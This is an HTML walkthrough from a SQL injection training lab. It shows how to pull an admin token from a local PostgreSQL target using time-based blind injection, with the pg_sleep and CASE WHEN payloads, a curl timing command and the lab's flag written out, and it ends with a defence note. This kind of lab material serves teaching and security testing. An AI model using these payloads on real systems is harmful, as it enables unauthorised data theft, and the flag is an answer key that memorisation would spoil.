<h4>Step 1: Observe the Constant Response</h4>
<p>
    Enter any token: valid or invalid: and notice the page always shows
    the same message. There is no boolean signal and no error output.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. No Boolean Signal</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>test123<br>
        <span class="prompt">Response: </span><strong>Session checked.</strong> (Response time: 0s)<br><br>
        <span class="prompt">Input: </span>completely_invalid<br>
        <span class="prompt">Response: </span><strong>Session checked.</strong> (Response time: 0s)
    </div>
</div>

<h4>Step 2: Confirm Injection via pg_sleep()</h4>
<p>
    Since the response is always identical, use <code>pg_sleep()</code> to create a measurable
    time delay. If the response takes longer, injection is confirmed.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Confirm with pg_sleep</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' OR pg_sleep(2) IS NOT NULL --<br>
        <span class="prompt">Response: </span>Session checked. <strong>(Response time: 6.01s)</strong><br><br>
        <span class="prompt">// Note: </span>pg_sleep(2) fires <strong>per row</strong> in the sessions table.<br>
        <span class="prompt">// </span>With 3 rows: 2s x 3 = ~6 seconds total delay (confirmed in testing).
    </div>
</div>

<h4>Step 3: Conditional Timing with CASE WHEN</h4>
<p>
    Use <code>CASE WHEN condition THEN pg_sleep(2) ELSE pg_sleep(0) END</code> inside a
    subquery to create a conditional delay. The subquery approach avoids the per-row multiplier.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Conditional CASE WHEN</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// TRUE condition -- sleeps 2s:</span><br>
        <span class="prompt">Input: </span>' OR (SELECT CASE WHEN 1=1 THEN pg_sleep(2) ELSE pg_sleep(0) END) IS NOT NULL --<br>
        <span class="prompt">Response: </span>Session checked. <strong>(~2 second delay)</strong><br><br>
        <span class="prompt">// FALSE condition -- instant:</span><br>
        <span class="prompt">Input: </span>' OR (SELECT CASE WHEN 1=2 THEN pg_sleep(2) ELSE pg_sleep(0) END) IS NOT NULL --<br>
        <span class="prompt">Response: </span>Session checked. <strong>(instant ~10ms)</strong>
    </div>
</div>

<h4>Step 4: Determine the Token Length</h4>
<p>
    Use the timing oracle to find the length of the admin token.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Find Token Length</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' OR (SELECT CASE WHEN LENGTH(token)>20 THEN pg_sleep(2) ELSE pg_sleep(0) END FROM admin_tokens LIMIT 1) IS NOT NULL --<br>
        <span class="prompt">Response: </span>~2s delay (TRUE -- length > 20)<br><br>
        <span class="prompt">Input: </span>' OR (SELECT CASE WHEN LENGTH(token)>25 THEN pg_sleep(2) ELSE pg_sleep(0) END FROM admin_tokens LIMIT 1) IS NOT NULL --<br>
        <span class="prompt">Response: </span>instant (FALSE -- length <= 25)<br><br>
        <span class="prompt">Input: </span>' OR (SELECT CASE WHEN LENGTH(token)=25 THEN pg_sleep(2) ELSE pg_sleep(0) END FROM admin_tokens LIMIT 1) IS NOT NULL --<br>
        <span class="prompt">Response: </span><strong>~2s delay (TRUE -- token is 25 characters)</strong>
    </div>
</div>

<h4>Step 5: Extract the First Character</h4>
<p>
    Use <code>SUBSTRING()</code> with the timing oracle to extract each character.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Extract First Character</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' OR (SELECT CASE WHEN SUBSTRING(token,1,1)='F' THEN pg_sleep(2) ELSE pg_sleep(0) END FROM admin_tokens LIMIT 1) IS NOT NULL --<br>
        <span class="prompt">Response: </span><strong>~2s delay (TRUE -- first char is 'F')</strong>
    </div>
</div>

<h4>Step 6: Binary Search with ASCII</h4>
<p>
    Use <code>ASCII()</code> with greater-than comparisons to binary-search each character,
    reducing requests from ~40 to ~7 per position.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. Binary Search</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Testing position 1 (target: 'F' = ASCII 70)</span><br><br>
        <span class="prompt">Input: </span>' OR (SELECT CASE WHEN ASCII(SUBSTRING(token,1,1))>70 THEN pg_sleep(2) ELSE pg_sleep(0) END FROM admin_tokens LIMIT 1) IS NOT NULL --<br>
        <span class="prompt">Response: </span>instant (FALSE -- ASCII <= 70)<br><br>
        <span class="prompt">Input: </span>' OR (SELECT CASE WHEN ASCII(SUBSTRING(token,1,1))=70 THEN pg_sleep(2) ELSE pg_sleep(0) END FROM admin_tokens LIMIT 1) IS NOT NULL --<br>
        <span class="prompt">Response: </span>~2s delay (TRUE -- ASCII 70 = 'F')
    </div>
</div>

<h4>Step 7: Full Extraction</h4>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 7. Complete Flag</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Position: </span> 1  2  3  4  5  6  7  8  9  10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25<br>
        <span class="prompt">Char:     </span> F  L  A  G  {  p  g  _  s  l  3  3  p  _  t  1  m  3  _  b  l  1  n  d  }<br><br>
        <span class="prompt">Flag: </span><strong>FLAG{pg_sl33p_t1m3_bl1nd}</strong>
    </div>
</div>

<h4>Step 8: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{pg_sl33p_t1m3_bl1nd}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Manual Timing Test</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -w "\nTime: %{time_total}" "http://localhost/SQLi-Arena/pgsql/lab5" \<br> --data-urlencode "token=' OR (SELECT CASE WHEN ASCII(SUBSTRING(token,1,1))=70 THEN pg_sleep(2) ELSE pg_sleep(0) END FROM admin_tokens LIMIT 1) IS NOT NULL --"<br><br>
        <span class="prompt"># </span>Response time: 2s -- confirms ASCII 70 = 'F'<br>
        <span class="prompt">Output:</span> Response: Session checked. Response time: 2s<br>
        <span class="prompt">Time: </span>2.030295
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> Time-based blind injection is the last resort when there is absolutely
    no difference in the application's visible response. PostgreSQL's <code>pg_sleep(seconds)</code> creates
    a server-side delay that can be measured client-side. Note that <code>pg_sleep()</code> fires
    <strong>per row</strong> when used directly in a WHERE clause -- wrap it in a subquery with
    <code>CASE WHEN</code> and <code>LIMIT 1</code> for predictable 1x delays. Defense: use
    <code>pg_query_params()</code> with <code>$1</code> placeholders and set query timeouts.
</div>
